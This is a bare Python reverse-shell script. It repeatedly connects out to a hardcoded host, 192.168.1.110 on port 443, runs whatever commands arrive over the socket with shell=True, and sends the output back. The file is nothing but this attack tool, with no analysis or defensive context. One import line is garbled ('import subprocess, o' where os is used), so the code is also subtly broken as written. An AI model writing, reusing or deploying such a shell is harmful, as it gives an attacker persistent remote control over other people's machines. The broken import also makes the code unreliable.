#!/usr/bin/python
def con():
	import socket, time
	host='192.168.1.110'
	port=443
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	while True:
		try:
			s.connect((host,port))
			shell(s)
		except Exception as error:
			time.sleep(5)
			s.close()
			con()

def shell(s):
	import subprocess, o
	pseudo_tty=os.uname()
	while True:
		s.send(pseudo_tty[1]+'~# ')
		cmd=s.recv(1024)
		if not  cmd[:4] == 'exit':
			proc = subprocess.Popen(cmd,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			output=proc.stdout.read() + proc.stderr.read()
			s.send(output.encode())
		else:
			s.close()	
			con()
		
con()
